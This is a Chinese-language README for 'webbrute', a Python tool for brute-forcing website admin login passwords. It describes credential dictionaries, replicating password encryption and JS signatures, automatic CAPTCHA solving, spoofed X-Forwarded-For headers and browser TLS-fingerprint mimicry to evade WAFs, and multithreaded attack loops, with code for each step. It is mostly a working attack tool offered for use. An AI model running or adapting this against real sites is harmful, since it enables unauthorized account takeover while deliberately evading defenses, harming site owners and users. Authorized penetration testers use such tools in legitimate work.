# 介绍

攻防实战中爆破网站后台密码时，经常会遇到各式各样的请求格式以及特殊需求，比如：

1. 用户名或密码需要经过特殊加密
2. 请求头中需要携带数字签名，而数字签名需要通过调用某个JS函数获得
3. 想要每次请求时携带随机的XFF头
4. 请求体中需要携带CSRF Token
5. 图片验证码识别
6. 想要把工具放在服务器上以极慢的请求速度长期运行
7. ...

为了解决以上问题，于是有了这个项目。

# 特点

1. 使用 Python + wreq-python + PyCryptodome 的组合进行开发，使用 wreq-python 模拟真实浏览器TLS指纹，避免被WAF识别
2. 预置了常见的加密/哈希算法（DES、AES、RSA、MD5、HMAC、Base64），登录时直接调用即可实现用户名密码加密
3. 支持使用 QuickJS 执行JS脚本，无需依赖浏览器环境，轻量高效
4. 内置 ONNX 验证码识别模块，支持 `dddd` 通用识别和 `ruoyi`（若依）专用识别，可识别字节图片与内联Base64图片
5. 支持多线程并发操作，以及设置每次发起请求前延迟固定时间
7. 每次请求自动携带随机 X-Forwarded-For 等伪造IP头
8. 内置重试机制，遇到502等服务器错误可自动重试
9. 连续异常超过20次自动退出，避免无意义请求

# 项目结构

```
webbrute.py          # 主程序入口，包含全局配置、爆破函数和线程池调度
requirements.txt     # Python依赖库
utils/
    crypto.py        # 加密/哈希工具（DES、AES、RSA、MD5、HMAC、Base64）
    execjs.py        # JS脚本执行模块（基于QuickJS）
captchadet/
    captchadet.py    # 验证码识别统一封装（DdddOcr / RuoyiOcr）
    dddd/            # 通用验证码模型与推理逻辑
    ruoyi/           # 若依验证码模型与推理逻辑
test/
    signature.js     # JS脚本示例文件
    image.png        # 验证码识别示例文件
```

# 使用教程

## 一、安装Python所需依赖库

```
pip install -r requirements.txt
```

requirements.txt 中包含以下依赖：

```
wreq-python     # HTTP请求库，支持浏览器TLS指纹模拟
lxml            # HTML解析，用于XPath提取CSRF Token等
pycryptodome    # 加密算法库
opencv-python   # 图像预处理
onnxruntime     # ONNX模型推理
```

> 可选：Windows 下首次使用 onnxruntime 可能需要安装 VC 运行时：https://learn.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist

> 可选：如果需要执行JS脚本，需手动下载 [QuickJS](https://github.com/quickjs-ng/quickjs) 并将路径添加到环境变量中

## 二、设置密码字典

定位到 `webbrute.py` 中的 `configs` 全局配置字典，`username_list / password_list` 储存的是内置的用户名和密码列表，可以直接填入一些自定义的账号或密码，`username_file_path / password_file_path` 指定用户名字典文件和密码字典文件的路径，留空则不读取对应的字典文件：：

```python
"usernames": {
    "username_list": [
        "admin"
    ],
    "username_file_path": [
        "/path/to/username.txt"
    ]
},

"passwords": {
    "password_list": [
        "123456"
    ],
    "password_file_path": [
        "/path/to/password.txt"
    ]
}
```

## 三、设置全局配置

`configs` 字典中的其他配置项：

```python
# 超时时间，单位秒
"timeout": 10,

# 线程并发数，在涉及到验证码识别的时候不建议使用多线程，线程并发需要设置为1
"threads": 10,

# 每个线程发起请求后暂停时长，单位秒
"delay": 1,

# 密码爆破日志
"logfile": {
    "history": "history.txt",     # 爆破历史文件，里面储存了爆破过的账号密码，用于防止重复爆破
    "found": "found.txt",         # 正常的爆破日志
    "exception": "exception.txt", # 发生异常时的日志
},

# 设置代理
"proxy": "http://admin:123456@127.0.0.1:8080", # 代理值为空字符串、None则表示不使用代理

# 自定义headers
"headers": {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
    "Connection": "close",
},

# 自定义cookies
"cookies": {
    "JSESSIONID": "123456"
}
```

## 四、加密算法调用（可选）

爆破时经常会遇到密码经过加密或哈希后再提交的情况。加密工具已封装在 `utils/crypto.py` 中，在 `run` 函数中按需调用即可：

```python
from utils import crypto

password = crypto.DES_encrypt("123456")     # DES加密，输出Base64
password = crypto.AES_encrypt("123456")     # AES加密，输出Base64
password = crypto.RSA_encrypt("123456")     # RSA加密，输出Base64
password = crypto.MD5_hash("123456")        # MD5哈希，输出HEX
password = crypto.HMAC_hash("123456")       # HMAC-SHA256哈希，输出HEX
password = crypto.Base64_encode("123456")   # Base64编码
```

> 加密函数中的密钥/公钥均为示例，实际使用时需根据目标网站修改 `utils/crypto.py` 中对应的密钥
> RSA加密同时支持 Base64 格式公钥和 PEM 格式公钥，详见 `utils/crypto.py` 中的注释
> 每个加密函数默认输出 Base64 格式，如需 HEX 格式，可取消注释 `binascii.hexlify` 那一行

## 五、JS脚本调用（可选）

如果遇到提交的某些数据需要调用网页中的JS函数才能获得，可以使用 QuickJS 来执行JS脚本。

首先需要手动下载 [QuickJS](https://github.com/quickjs-ng/quickjs)，并将其路径添加到系统环境变量中。

JS执行模块位于 `utils/execjs.py`，默认调用 `qjs.exe` 来执行JS代码：

```python
from utils import execjs

# 需要先修改 utils/execjs.py 中的功能函数，自行定制所需功能
signature = execjs.signature("123456")
print(signature)
```

> `utils/execjs.py` 中的 `signature` 函数仅是示例，需要根据实际场景自行编写函数
> JS脚本文件（如 `test/signature.js`）需要根据目标网站的JS逻辑进行编写

## 六、验证码识别（可选）

验证码识别已内置在 `captchadet` 中，提供两个后端：

+ `captchadet.DdddOcr()`：通用验证码识别
+ `captchadet.RuoyiOcr()`：若依框架验证码识别（新增）

```python
from captchadet import captchadet

# 二选一：通用识别 or 若依识别
ocr = captchadet.DdddOcr()
# ocr = captchadet.RuoyiOcr()

# 方式一：识别字节格式图片
response = session.get("https://example.com/login/vcode")
captcha = ocr.identify_image_bytes(response.content)

# 方式二：识别内联Base64图片（如 data:image/png;base64,iVBOR...）
captcha = ocr.identify_image_inline(response.text)

# 方式三：识别本地图片文件
captcha = ocr.identify_image_filepath("test/captcha.png")
```

> 建议根据目标站点选择后端：普通站点优先使用 `DdddOcr`，若依站点优先使用 `RuoyiOcr`

> 在涉及到验证码识别时不建议使用多线程，应将 `configs["threads"]` 设置为 1

## 七、编写爆破函数

上面的步骤都是可选的准备环节，核心要编写的是 `webbrute.py` 中的 `run` 函数，它负责发起单次登录操作：

```python
def run(username, password):
    ...
```

> 该函数由 `futures.ThreadPoolExecutor` 线程池负责调度，每调用一次 `run` 函数，就发起一次登录操作

> `run` 函数的参数 `username`、`password` 由线程池根据爆破模式自动填充

代码中已提供了一个示例模板，以下是关键要点：

**1. 自动伪造IP头**

每次请求会自动生成随机IP并添加到 X-Forwarded-For、X-Real-IP 等请求头中，无需手动处理。

**2. 使用 wreq-python 发起请求**

```python
client = Client(emulation=Emulation.Chrome153)

data = {
    "username": username,
    "password": password
}
response = client.post(url, json=data, cookies=cookies, headers=headers, proxy=proxy, timeout=timeout, verify=False)
```

> wreq-python 的 `emulation` 参数可模拟真实浏览器的TLS指纹

**3. 内置重试机制**

`run` 函数内有一个 while 循环，可以针对特定条件（如服务器返回502、验证码识别错误等）自动进行重试，超过次数上限后抛出异常：

```python
error = {}
error["502"] = 0
while True:
    # ... 发起请求 ...
    if response.status == 502:
        error["502"] += 1
        if error["502"] > 5:
            raise Exception("Server internal error")
        continue
    else:
        break
```

**4. 判断登录结果**

一般情况下可以知道登录失败会返回什么报文，而不知道登录成功会返回什么报文，因此建议在 `if` / `elif` 中编写失败的判断条件，用 `else` 来处理登录成功的情况：

```python
if "用户不存在" in response.text():    # 失败条件1
    return
elif "密码错误" in response.text():    # 失败条件2
    return
else:                                # 成功
    info_message(f"[++] Found {username}:{password} ...")
    return
```

> 常见的判断方式还有：`response.status == 401`、`len(response.text()) == 100`、检查 302 跳转的 Location 等，根据实际场景调整即可

**5. XPath提取CSRF Token**

如果登录请求需要携带 CSRF Token，可以用 lxml 的 XPath 从页面中提取：

```python
from lxml import etree

response = session.get("https://example.com/login")
html = etree.HTML(response.text, etree.HTMLParser())
csrftoken = html.xpath('//input[@type="hidden" and @id="csrf"]/@value')[0]
```

编写完 `run` 函数后，即可运行：

```
python webbrute.py
```

## 八、线程池调度

+ `webbrute.py` 底部的线程池调度和日志输出代码，建议保持默认即可

+ 线程池支持 `Ctrl+C` 键盘中断，可随时停止程序运行

+ 工具每隔5分钟以百分比形式汇报一次进度，方便预估运行时间

+ 每个线程运行期间如果遭遇异常，会累加异常计数；如果下一个线程能正常完成请求，异常计数归零；连续异常累计超过10次时程序自动退出，避免无意义的请求

+ 成功找到的密码会记录在 `found.txt` 文件里；遭遇异常的密码会记录在 `exception.txt` 中，方便后续重新尝试

# 代码用例

加密密码

```
from utils import crypto

password = crypto.DES_encrypt("123456")
password = crypto.AES_encrypt("123456")
password = crypto.RSA_encrypt("123456")
password = crypto.MD5_hash("123456")
password = crypto.Base64_encode("123456")
```

验证码识别

```
from captchadet import captchadet

ocr = captchadet.DdddOcr() # or captchadet.RuoyiOcr()
# response = client.get("https://example.com/login/vcode")
captcha = ocr.identify_image_bytes(bytes(response.bytes()))
captcha = ocr.identify_image_inline(response.text()) # text = data:image/png;base64,iVBOR...
print(captcha)
```

使用XPath读取CSRF Token

```
from lxml import etree

response = client.get("https://example.com/login")
html = etree.HTML(response.text, etree.HTMLParser())
csrftoken = html.xpath('//input[@type="hidden" and @id="csrf"]/@value')[0]
print(csrftoken)
```

使用QuickJS执行JS

```
from utils import execjs

signature = execjs.signature("123456") # 这里需要修改execjs中的功能函数，自行定制所需功能
print(signature)
```
